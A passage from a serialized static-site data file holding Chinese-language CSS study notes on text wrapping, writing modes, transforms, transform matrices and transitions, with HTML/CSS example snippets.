wrap,\n    which  means   that the only way   to end a    line is to insert a line-break element.  if no such element is inserted,    then the line will go forever,\n    forcing the user to    scroll    horizontally to    read whatever can\'t be\n    initially displayed <br>in the browser window.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 500px; }\n    /*pre-wrap其实和pre差不多，多余空白被保留，遇到换行符和<br>进行换行。但是在超过父容器宽度时换行*/\n    /*pre-line，多余空白被合并，遇到换行符和<br>进行换行，在超过父容器宽度时换行*/\n    p { white-space: pre-line; } /* pre-wrap和pre-line替换看效果*/\n    </style>\n</head>\n<body>\n    \x3c!--normal和nowrap，都会让多余的空格进行合并，并且换行符也会被视为空格。超过父容器宽度时就不一样了。--\x3e\n    <p>        this   paragraph   is   not   allowed   to   wrap,\n    \n    which  means   that the only way   to end a    line is to insert a line-break element.  if no such element is inserted,    then the line will go forever,\n    forcing the user to    scroll    horizontally to    read whatever can\'t be\n    initially displayed <br>in the browser window.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\ntab-size用于设置（在块级元素上，对内部的内联元素作用）制表符对应的空格，默认情况下是8个空格。它还可以设置长度，一个制表符的长度。\n\n<html>\n<head>\n    <style type="text/css">\n    p { white-space: pre-wrap; margin: 0.5em; }\n    code { font: 1em monospace, serif; }\n    .cl01 { tab-size: 8; }\n    .cl02 { tab-size: 4; }\n    .cl03 { tab-size: 2; }\n    .cl04 { tab-size: 0; }\n    .cl05 { tab-size: 8; white-space: normal; }\n    </style>\n</head>\n<body>\n    <p class="cl01">            this sentence is preceded by three tabs, set to a length of 8.\n    </p>\n    <p class="cl02">            this sentence is preceded by three tabs, set to a length of 4.\n    </p>\n    <p class="cl03">            this sentence is preceded by three tabs, set to a length of 2.\n    </p>\n    <p class="cl04">            this sentence is preceded by three tabs, set to a length of 0.\n    </p>\n    <p class="cl05">            this sentence is preceded by three tabs, set to a length of 8—but <code>white-space</code> is <code>normal</code>.\n    </p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 2.9 处理文本换行\n\n# 2.9.1 连字符\n\n在长单词换行或者连起来的词组时常使用连字符-，在编码中是u+00ad或&shy;。在css中是hyphens属性，值有manual | auto | none。manual表示手动插入u+00ad或&shy;才会显示连字符，none会忽略连字符即使使用了u+00ad或&shy;，auto是自动根据文本的换行对长单词添加连字符。不过连字符在浏览器可能不会被实现，这个得注意。\n\n# 2.9.2 word-break\n\nword-break用于文本换行时，对单词或者其他文字的处理行为，其值有normal、keep-all、break-all。normal表示使用浏览器默认换行规则，keep-all表示只能在半角空格或连字符处换行、break-all表示允许在单词内换行。\n\n浏览器默认换行：英文下，不会在单词内换行，只会在半角空格或连字符的地方换行；中文不会有这样的问题，标点符号也不会作为一行的首字，会拿一个汉字和标点符号一起换行。\n\n<html lang="en">\n<head>\n<style type="text/css">\np {border: 1px dotted orange;}\ndiv {float: left; width: 12em; margin-right: 3em;}\ndiv h6 {text-align: center;}\n.d01 {word-break: normal;}\n.d02 {word-break: break-all;}\n.d03 {word-break: keep-all;}\n.cl02 {direction: rtl;}\n</style>\n</head>\n<body>\n    <div class="d01">\n        <h6>word-break: normal;</h6>\n        <p class="cl01">it is fine today.never change your plans because of the weather.</p>\n        <p class="cl02">هذا هو سلسلة طويلة غامضة من النص العربي، الذي يتدفق من اليمين إلى اليسار.</p>\n        <p class="cl03">これは、左から右に流れる漠然と日本語テキストの長い文字列です。</p>\n        <p class="cl04">天气真不错，出去逛逛吧？去哪呢？去南京东路步行街吧！</p>\n    </div>\n    <div class="d02">\n        <h6>word-break: break-all;</h6>\n        <p class="cl01">it is fine today.never change your plans because of the weather.</p>\n        <p class="cl02">هذا هو سلسلة طويلة غامضة من النص العربي، الذي يتدفق من اليمين إلى اليسار.</p>\n        <p class="cl03">これは、左から右に流れる漠然と日本語テキストの長い文字列です。</p>\n        <p class="cl04">天气真不错，出去逛逛吧？去哪呢？去南京东路步行街吧！</p>\n    </div>\n    <div class="d03">\n        <h6>word-break: keep-all;</h6>\n        <p class="cl01">it is fine today.never change your plans because of the weather.</p>\n        <p class="cl02">هذا هو سلسلة طويلة غامضة من النص العربي، الذي يتدفق من اليمين إلى اليسار.</p>\n        <p class="cl03">これは、左から右に流れる漠然と日本語テキストの長い文字列です。</p>\n        <p class="cl04">天气真不错，出去逛逛吧？去哪呢？去南京东路步行街吧！</p>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n可以看上面这个例子里，break-all对英文不友好因为切断了单词，对中文挺正常的（与normal中文环境下一致）；而keep-all在英文下还挺正常的（与normal英文环境下一致），但对中文就不友好了，必须遇到标点符号才能换行。综上，最好还是使用word-break: normal。\n\n# 2.9.2 overflow-wrap\n\n英文的换行只在半角空格或连字符的地方换行，但是长单词里没有半角空格和连字符，那它显示时就会超过边界，那么使用overflow-wrap: break-word可以解决长单词的问题。overflow-wrap的另外一个值normal，表示在正常断点处换行，如果长单词超过边界就直接溢出显示。\n\n因为历史原因，word-wrap属性原本属于微软的一个私有属性，在 css3 现在的文本规范草案中已经被重名为overflow-wrap。word-wrap现在被当作 overflow-wrap的“别名”。 稳定的谷歌chrome和opera浏览器版本支持这种新语法。\n\nwhite-space: pre的设置会让overflow-wrap: break-word对长单词的处理失效，因为white-space: pre只在换行符和<br>时换行，在满父容器一行时也不会自动换行的。\n\n<html lang="en">\n<head>\n<style type="text/css">\np { width: 14em; margin: 2px; background: gold; }\n.ow-anywhere { overflow-wrap: normal; }\n.ow-break-word { overflow-wrap: break-word; }\n.word-break { word-break: break-all; }\n.pre { overflow-wrap: break-word; white-space: pre; }\n</style>\n</head>\n<body>\n    <p>they say the fishing is excellent at\n    lake <em class="normal">chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though i\'ve never been there myself. (<code>normal</code>)</p>\n    <p>they say the fishing is excellent at \n    lake <em class="ow-anywhere">chargoggagoggmanchauggagoggchaubunagungamaugg</em>, \n    though i\'ve never been there myself. (<code>overflow-wrap: normal</code>)</p>\n    <p>they say the fishing is excellent at\n    lake <em class="ow-break-word">chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though i\'ve never been there myself. (<code>overflow-wrap: break-word</code>)</p>\n    <p>they say the fishing is excellent at\n    lake <em class="word-break">chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though i\'ve never been there myself. (<code>word-break: break-all;</code>)</p> \n    <p>they say the fishing is excellent at\n    lake <em class="pre">chargoggagoggmanchauggagoggchaubunagungamaugg</em>,\n    though i\'ve never been there myself. (<code>overflow-wrap: break-word;white-space: pre;</code>)</p> \n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 2.10 书写模式\n\n# 2.10.1 writing-mode\n\nwriting-mode属性用于指定三种书写模式，值有horizontal-tb | vertical-rl | vertical-lr。\n\n * horizontal-tb：表示一个水平的内联方向，一个从上到下的块方向。默认为文字是从左到右然后从上到下。\n * vertical-rl：表示一个垂直的内联方向，一个从右到左的块方向。默认为文字是从上到下然后从右到左。\n * vertical-lr：表示一个垂直的内联方向，一个从左到右的块方向。默认为文字是从上到下然后从左到右。\n\n\n\n# 2.10.2 text-orientation\n\n在确定了书写模式后，我们可以更改个别文本的字符方向，因为有可能需要显示不同语言的文本，或者表头需要临时的不同字符方向的显示。\n\ntext-orientation属性就是用于此，有三个值mixed | upright | sideways。特别要注意的是，水平书写方式是正常的，text-orientation是不会起作用，但是会改变writing-mode: vertical-rl和writing-mode: vertical-lr里的字符展示方向，也就是说text-orientation只会影响纵向的。\n\n * mixed：默认值。各种语言混合的，原本是怎么展示的就怎么展示。比如英文在垂直展示时是“躺着”的就仍然“躺着”，中文在垂直展示时是“站着”的就仍然“站着”。\n * upright：将字符进行直排。比如英文在垂直展示时是“躺着”的，那现在是“站着”的，中文不变。\n * sideways：所有字符被布局为与水平方式一样，只是整个文本被顺时针旋转90°。也就是说，它是将horizontal-tb情况下的展示效果顺时针旋转90°。\n\n<html>\n<head>\n    <style>\n    [lang="zh"] { color: blue; }\n    .arena p[class] {\n        border: 1px dotted;\n        float: left;\n        width: 11rem;\n        height: 9em;\n        margin-right: 2rem;\n        margin-left: 0;\n        writing-mode: vertical-lr;\n    }\n    .cl1 { text-orientation: mixed; }\n    .cl2 { text-orientation: upright; }\n    .cl3 { text-orientation: sideways; }\n    div.labels { clear: left; display: flex; }\n    div.labels h6 {\n        display: inline-block;\n        width: 11rem;\n        text-align: center;\n        height: auto;\n        margin-top: 0.5em;\n        margin-right: 2em;\n    }\n    </style>\n</head>\n<body>\n    <div class="arena">\n        <p>this is a paragraph of <span lang="zh">中文</span> and english text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <p class="cl1">this is a paragraph of <span lang="zh">中文</span> and english text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <p class="cl2">this is a paragraph of <span lang="zh">中文</span> and english text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <p class="cl3">this is a paragraph of <span lang="zh">中文</span> and english text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <div class="labels">\n            <h6>mixed</h6>\n            <h6>upright</h6>\n            <h6>sideways</h6>\n        </div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n# 2.10.3 direction\n\n在以前可以通过改变内联基线方向来影响文本的方向，也就是direction属性和unicode-bidi属性，我们不建议使用它们，因为你可能稍不注意就改变了页面其他地方的显示效果，这两个属性是浏览器文档设计者专用的，我们web开发人员了解一下就好。\n\n不建议使用的原因还有一个，html有个dir决定元素方向，而css的direction的效果和它一样并且会覆盖html的dir效果，建议是使用html的dir而不是css的direction。\n\ndirection属性有两个值，ltr表示从左到右的方向，这是书写模式下默认的方向（英文等），另一个是与之相反的rtl从右到左。这个属性会影响到块级元素内部文本的方向、表格列的布局、溢出方向等等。',charsets:{cjk:!0}},{title:"4.变换、过渡、动画",frontmatter:{title:"4.变换、过渡、动画"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/4.%E5%8F%98%E6%8D%A2%E3%80%81%E8%BF%87%E6%B8%A1%E3%80%81%E5%8A%A8%E7%94%BB.html",relativePath:"book-web/html、css、js、ts/学习CSS/4.变换、过渡、动画.md",key:"v-11941828",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/4.%E5%8F%98%E6%8D%A2%E3%80%81%E8%BF%87%E6%B8%A1%E3%80%81%E5%8A%A8%E7%94%BB.html",headers:[{level:2,title:"一、CSS坐标系",slug:"一、css坐标系",normalizedTitle:"一、css坐标系",charIndex:15},{level:2,title:"二、变换",slug:"二、变换",normalizedTitle:"二、变换",charIndex:256},{level:3,title:"2.1 变换源点",slug:"_2-1-变换源点",normalizedTitle:"2.1 变换源点",charIndex:265},{level:3,title:"2.2 变换类型",slug:"_2-2-变换类型",normalizedTitle:"2.2 变换类型",charIndex:482},{level:3,title:"2.3 组合变换",slug:"_2-3-组合变换",normalizedTitle:"2.3 组合变换",charIndex:4280},{level:3,title:"2.4 变换矩阵",slug:"_2-4-变换矩阵",normalizedTitle:"2.4 变换矩阵",charIndex:4923},{level:2,title:"三、过渡",slug:"三、过渡",normalizedTitle:"三、过渡",charIndex:8032},{level:3,title:"3.1 元素过渡",slug:"_3-1-元素过渡",normalizedTitle:"3.1 元素过渡",charIndex:8041},{level:3,title:"3.2 过渡多个属性",slug:"_3-2-过渡多个属性",normalizedTitle:"3.2 过渡多个属性",charIndex:8727},{level:3,title:"3.3 使用过渡注意点",slug:"_3-3-使用过渡注意点",normalizedTitle:"3.3 使用过渡注意点",charIndex:11353},{level:2,title:"四、动画",slug:"四、动画",normalizedTitle:"四、动画",charIndex:13373},{level:3,title:"4.1 动画能做什么",slug:"_4-1-动画能做什么",normalizedTitle:"4.1 动画能做什么",charIndex:13382},{level:3,title:"4.2 动画关键帧",slug:"_4-2-动画关键帧",normalizedTitle:"4.2 动画关键帧",charIndex:14077},{level:3,title:"4.3 动画的几个属性",slug:"_4-3-动画的几个属性",normalizedTitle:"4.3 动画的几个属性",charIndex:16806}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、CSS坐标系 二、变换 2.1 变换源点 2.2 变换类型 2.3 组合变换 2.4 变换矩阵 三、过渡 3.1 元素过渡 3.2 过渡多个属性 3.3 使用过渡注意点 四、动画 4.1 动画能做什么 4.2 动画关键帧 4.3 动画的几个属性",content:'# 变换、过渡、动画\n\n\n# 一、CSS坐标系\n\n在CSS中，系统使用三个轴：x轴（横轴）、y轴（纵轴）、z轴（深度轴）。x轴向右是正方向，向左是负方向；y轴得注意了，它向下是正方向，而向上是负方向的，如果使用过绝对定位的应该能理解到；z轴的正方向是朝向我们开发者的，负值是远离我们的方向（朝屏幕里）。\n\n\n\n/* 左移动5个ems，向下移动33个像素，朝我们移动了200个像素 */\ntranslateX(-5em) translateY(33px) translateZ(200px)\n\n\n1\n2\n\n\n\n# 二、变换\n\n\n# 2.1 变换源点\n\n在对一个元素进行变换时，一般都是取它的中心点为坐标系原点（作为变换源点），比如一个矩形就是宽一半高一半的那个点，长方体就是长宽高各一半的那个点。\n\n变换源点是可以修改的，比如transform-origin: 10px 20px，取元素展示尺寸左上角顶点的右边10px和下边20px的位置为变换源点。也可以使用非长度数值，例如left | center | right | top | bottom。\n\n\n\n\n# 2.2 变换类型\n\n在CSS中可以通过transform属性来让元素进行变换，主要有4种变换类型：移动、缩放、旋转以及倾斜。\n\n# 2.2.1 移动\n\ntransform: translate()是用来移动元素的，translate()需要传一到两个参数告诉css在水平和垂直方向上要移动的距离。当然也可以使用translateX()和translateY()来单独对水平和垂直方向进行移动。参数形式可以是长度数值也可以是百分比，如果是百分比，距离将以元素自身大小的百分比计算。\n\ntranslate()是在2d上进行移动变换的，其实在3d上有translate3d()来进行移动变换，可接受三个参数分别控制X、Y、Z方向的位移，其效果与组合使用translateX()、translateY()、translateZ()是一样的。有一点要注意，translate3d()的第三个参数以及translateZ()的参数，也就是z方向的移动参数，暂时不能使用百分比形式。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: translate(10px, 10px);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--向右移动10个像素，向下移动10个像素--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 2.2.2 缩放\n\ntransform: scale()是用来缩放元素的，scale()需要传一到两个参数告诉css在水平和垂直方向上的缩放系数。当然也可以使用scaleX()和scaleY()来单独对水平和垂直方向进行缩放。参数形式要是正数才行。\n\nscale()是在2d上进行缩放变换的，其实在3d上有scale3d()来进行缩放变换，可接受三个参数分别控制X、Y、Z方向的缩放，其效果与组合使用scaleX()、scaleY()、scaleZ()是一样的。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: scale(0.5, 2);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--水平缩短一半，垂直放大2倍--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 2.2.3 旋转\n\ntransform: rotate()是用来旋转元素的，rotate()需要传一个参数告诉css需要旋转什么样的角度。下面这个图例就是最常见的2d旋转效果，其实你仔细想一下它围绕着哪一个轴旋转的？\n\n\n\n是的，上面这个是绕Z轴进行旋转的，也就是说rotate()和rotateZ()是等价的。移动和缩放是沿着轴方向进行变换，旋转是围绕轴心进行变换，这个一定得理解清楚。\n\nrotate()的旋转轴心是Z轴，垂直于电脑屏幕并且正方向是指向观察者（开发者）的，它只接收一个参数（角度单位deg、grad、rad、turn），其参数角度是正值的话就是顺时针旋转，负值是逆时针旋转。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: rotate(45deg);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--没加transform时是水平的，加了transform后div是斜着45度显示的--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n有2d平面的旋转当然也有3d的旋转，rotateX()和rotateY()就是分别沿着X轴和Y轴的旋转变换，参数形式和rotate()一样。下面两个div你可要想清楚了，要先找到X和Y轴再来考虑它的显示效果。\n\n<html>\n<head>\n    <style type="text/css">\n        .div1 {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 50px;\n            transform: rotateX(45deg);\n        }\n        .div2 {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 10px;\n            margin-top: 100px;\n            transform: rotateY(45deg);\n        }\n    </style>\n</head>\n<body>\n    \x3c!--没加transform时看起来高就是10px，加了transform后高在视觉上只有7.07左右，因为10除以了根号2--\x3e\n    <div class="div1"></div>\n    \x3c!--没加transform时看起来宽就是100px，加了transform后宽在视觉上只有70.72左右，因为100除以了根号2--\x3e\n    <div class="div2"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n上面这两个例子都是向页面里旋转了45度，只不过轴心一个是X轴一个是Y轴。想象轴的正方向指向观察者（开发者），再按照正值顺时针和负值逆时针的转法来旋转的。\n\n# 2.2.4 倾斜\n\ntransform: skew()是用来倾斜元素的，skew()需要传一到两个参数告诉css在水平和垂直方向上的扭曲程度。当然也可以使用skewX()和skewY()来单独对水平和垂直方向进行扭曲。参数形式要是角度单位deg、grad、rad、turn。\n\n怎么理解呢？比如沿横坐标扭曲元素是改变x值，那么y数值是不变的，最后元素显示效果就会是纵轴方向上有倾斜角度。举个最简单的例子，头和身体一部分水平左移了，那么这个人看起来就是竖直方向的左倾斜了，水平处理但出现的是竖直倾斜效果。\n\n那么偏移方向怎么算呢？skewX(param)，param是正值就是Y轴正方向往X轴正方向偏移param角度，负值就是Y轴正方向往X轴负方向偏移param角度。skewY(param)，param是正值就是X轴正方向往Y轴正方向偏移param角度，负值就是X轴正方向往Y轴负方向偏移param角度。\n\nPS：在3d上没有倾斜，只有2d的。也就说没有skewZ()或者skew3d()这样的方法。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            border: 1px solid #333333;\n            width: 100px;\n            height: 20px;\n            margin-top: 50px;\n            transform: skew(30deg);\n        }\n    </style>\n</head>\n<body>\n    <div></div>\x3c!--X方向扭曲元素，是竖直方向的倾斜，倾斜角度是于Y轴正方向往X轴正方向偏移--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 2.3 组合变换\n\n在一些场景下需要对一个元素进行多次变化，那么就可以使用组合变换，例如#example { transform: rotate(30deg) skewX(-25deg) scaleY(2); }。 处理transform里的函数时是从左往右依次进行的，在具体场景里变换顺序是很重要的，比如下面这个例子的两种变换效果是不一样的。\n\nimg#one {\n  transform: translateX(200px) rotate(45deg);\n}\nimg#two {\n  transform: rotate(45deg) translateX(200px);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n上面这个例子能看出一个问题，我们变换的坐标系不止原点与中心点重合，X、Y、Z轴方向也是与元素本身这个矩形框的横纵深方向是重合的。旋转或者倾斜后，元素的坐标系xyz方向和页面内的参考坐标系xyz方向可能不一致了，那么下次变换是在现在元素本身坐标系xyz方向上移动。简单来说，变换操作跟页面参考坐标系没有关系，不要想不通它明明应该是往水平方向移动的为什么它却斜着移动的了。\n\n在组合变换中，所有函数都必须正确格式化，也就说只要有一个函数错了，整个transform值都无效。例如img#one { transform: translateX(100px) scale(1.2) rotate(22); }中rotate的入参没有单位，那么整个transform都无效。\n\n\n# 2.4 变换矩阵\n\n像前面的移动、缩放、旋转、倾斜在处理背后都有一个对应的变换矩阵，变换矩阵是建立在线性代数与几何的基础上的。2d变换是3×3矩阵，3d变换时4×4矩阵。transform: matrix()可以直接使用变换矩阵，matrix()函数就是用来接收矩阵数据的。\n\n# 2.4.1 矩阵运算\n\n设A为m × p的矩阵，B为p × n的矩阵，那么称m × n的矩阵C为矩阵A与B的乘积。具体相乘的细节就是，A的第i行与B的第j行对应相乘（因为都有p个）再把p个乘积相加，得到值可以构成C的(i,j)位置上的值。\n\na11, a12, a13     b11, b12, b13     a11*b11+a12*b21+a13*b31, a11*b12+a12*b22+a13*b32, a11*b13+a12*b23+a13*b33\na21, a22, a23  ×  b21, b22, b23  =  a21*b11+a22*b21+a23*b31, a21*b12+a22*b22+a23*b32, a21*b13+a22*b23+a23*b33\na31, a32, a33     b31, b32, b33     a31*b11+a32*b21+a33*b31, a31*b12+a32*b22+a33*b32, a31*b13+a32*b23+a33*b33\n\n\n1\n2\n3\n\n\n# 2.4.2 2d矩阵变换\n\nmatrix(a, b, c, d, tx, ty)对应的2d矩阵如下。可以使用matrix(scaleX(), skewY(), skewX(), scaleY(), translateX(), translateY())来理解，a和d是放大系数，c和b是倾斜系数，abcd绝对值小于1的话就是旋转系数，但这并不意味matrix是简单的组合变换，实际上简单变换、复杂变换以及组合变换背后才是matrix在运作，要理解但不能误解。\n\na, c, tx\nb, d, ty\n0, 0, 1\n\n\n1\n2\n3\n\n\n普通变换可以转为2d矩阵变换，例如：\n\n * translate(x, y)可以写成matrix(1, 0, 0, 1, x, y)；\n * scale(x, y)可以写成matrix(x, 0, 0, y, 0, 0)；\n * rotate(x)可以写成matrix(cos(x), -sin(x), sin(x), cos(x), 0, 0)；\n * skew(x, y)可以写成matrix(1, tan(y), tan(x) , 1, 0, 0)。\n\n例子：\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 80px;\n            height: 80px;\n            background-color: skyblue;\n        }\n        .changed {\n            /* 可以写成transform: matrix(1, 2, -1, 1, 80, 80); */\n            transform: translate(80px, 80px) skew(-45deg, 63deg);\n            background-color: pink;\n        }\n    </style>\n</head>\n<body>\n    <div>Normal</div>\n    <div class="changed">Changed</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n矩阵计算：\n\n// translate(80px, 80px) 与 skew(-45deg, 63deg)，矩阵形式相乘得到新矩阵就可以使用matrix了\n1, 0, 80     1, -1, 0     1, -1, 80\n0, 1, 80  ×  2,  1, 0  =  2,  1, 80\n0, 0, 1      0,  0, 1     0,  0, 1\n\n\n1\n2\n3\n4\n\n\n你可能想过将matrix(1, 2, -1, 1, 80, 80)的矩阵分拆成两个符合matrix规则的矩阵，然后反推得到translate(80px, 80px)和skew(-45deg, 63deg)。在简单场景下是可以的，比如根据之前提到的matrix(scaleX(), skewY(), skewX(), scaleY(), translateX(), translateY())， 可能会得到transform: scaleX(1) skewY(-45deg) skewX(63deg) scaleY(1) translateX(100px) translateY(100px);，但还不够需要再分析。\n\n// 其中x和y是原来的坐标，而x-y+80这个值是新的横坐标值，2x+y+80这个值是新的纵坐标值\n1, -1, 80     x     x-y+80\n2,  1, 80  ×  y  =  2x+y+80\n0,  0, 1      1     1\n\n\n1\n2\n3\n4\n\n * 根据矩阵计算的过程，常数项80没有受到系数干扰，translate(80px, 80px)是最优先的，因为如果先倾斜元素坐标系会改变再去移动就晚了；\n * 没有缩放只有倾斜，那么可以使用skewY(-45deg) skewX(63deg)，但是横纵的倾斜是同时进行的，那么应该是skew(-45deg, 63deg)。\n * 注意1：translate优先的原理分析在组合变换里说过了（顺序很重要）。\n * 注意2：skew要同时处理两个方向，因为如果扭曲完一个方向以达到45度的倾斜效果，那再去扭曲另一个方向达到63度的话之前45度的倾斜效果会受到影响。\n\n如果将上面的transform: matrix(1, 2, -1, 1, 80, 80)改为transform: matrix(2, 2, -1, 2, 80, 80)，此时既有缩放又有倾斜，再来反推是非常困难的，所以不要试图将matrix反推得到组合变换，一般是将复杂的组合变换简写为matrix矩阵变换的形式（为了维护也可以不简写）。\n\n# 2.4.3 3d矩阵变换\n\nmatrix(a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p)对应的3d矩阵如下。可以使用matrix(scaleX(), skewY(), skewX(), scaleY(), translateX(), translateY())来理解\n\na, e, i, m\nb, f, j, n\nc, g, k, o\nd, h, l, p\n\n\n1\n2\n3\n4\n\n\n普通3d变换可以转为3d矩阵变换，例如：\n\n * translate3d(x, y, z)可以写成matrix(1,0,0,0,0,1,0,0,0,0,1,0,x,y,z,1)；\n * scale3d(x, y, z)可以写成matrix(x,0,0,0,0,y,0,0,0,0,z,0,0,0,0,1)；\n * 旋转和倾斜比较复杂暂时没查到资料。\n\n\n# 三、过渡\n\n\n# 3.1 元素过渡\n\n元素样式的改变可以在一瞬间就完成，新属性替换旧属性再到重新绘制这个过程一般不会超过16毫秒，即使超过也是一步完成变化的，不会逐渐过渡。\n\nCSS提供了transition来控制某个属性在一段时间内属性值变化的过渡效果。用法：transition: property duration timing-function delay，其中property就是被监控的属性，duration是过渡时间，timing-function是过渡方式，delay是延时触发的时间。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 100px;\n            height: 20px;\n            background-color: skyblue;\n            transition: background-color 1s linear 3s;\n        }\n        div:hover {\n            background-color: pink;\n        }\n    </style>\n</head>\n<body>\n    \x3c!--当鼠标悬浮时，3秒后div背景颜色开始逐渐变为粉色，过渡用时1秒--\x3e\n    <div>Normal</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 3.2 过渡多个属性\n\ntransition: property duration timing-function delay是可以分开写的，看个人的习惯了。例如transition-property: transform;、transition-duration: 200ms;、transition-timing-function: ease-in;、transition-delay: 50ms;。\n\ntransition可以同时对多个属性进行过渡，使用,分隔开，同样的transition-property也可以写上多个属性，如果这些属性的过渡效果一样，那么其他的transition-duration、transition-timing-function、transition-delay就可以写一样的了。当然，如果效果不一样duration、timing-function、delay也要使用逗号将值分开。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 100px;\n            height: 20px;\n            background-color: skyblue;\n            transition: background-color 1s linear, color 1s linear, width 1s linear;\n        }\n        div:hover {\n            background-color: pink;\n            color: #ffff00;\n            width: 200px;\n        }\n    </style>\n</head>\n<body>\n    <div>Normal</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            width: 100px;\n            height: 20px;\n            background-color: skyblue;\n            /*与上面的例子是一样的效果*/\n            transition-property: background-color, color, width;\n            transition-duration: 1s;\n            transition-timing-function: linear;\n        }\n        div:hover {\n            background-color: pink;\n            color: #ffff00;\n            width: 200px;\n        }\n    </style>\n</head>\n<body>\n    <div>Normal</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n如果transition-property的值只是all的话，表示对所有属性都进行过渡；all也可以放在一群由逗号分隔的属性之前，它有什么意义呢？表示大部分属性都按照同一套过渡效果来进行，而all后面的属性会是例外。除了用all还有个none表示覆盖清除过渡，其实可以将过渡总时间设置为0。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n          color: #f00;\n          border: 1px solid #00ff00;\n          border-radius: 0;\n          transform: scale(1) rotate(0deg);\n          opacity: 1;\n          box-shadow: 3px 3px rgba(0, 0, 0, 0.1);\n          width: 50px;\n          padding: 50px;\n          transition-property: all, border-radius, opacity;\n          transition-duration: 1s, 3s, 5s;\n        }\n        div.normal:hover {\n            background-color: pink;\n            color: #ffff00;\n            padding: 100px;\n        }\n        div.change:hover {\n            background-color: pink;\n            color: #ffff00;\n            padding: 100px;\n            border-radius: 10px;\n            opacity: 0.1;\n        }\n    </style>\n</head>\n<body>\n    <div class="normal">Normal</div>\n    \x3c!--1秒改变背景和字体颜色还有内边距，3秒改变圆角，5秒逐渐透明--\x3e\n    <div class="change">Change</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 3.3 使用过渡注意点\n\n# 3.3.1 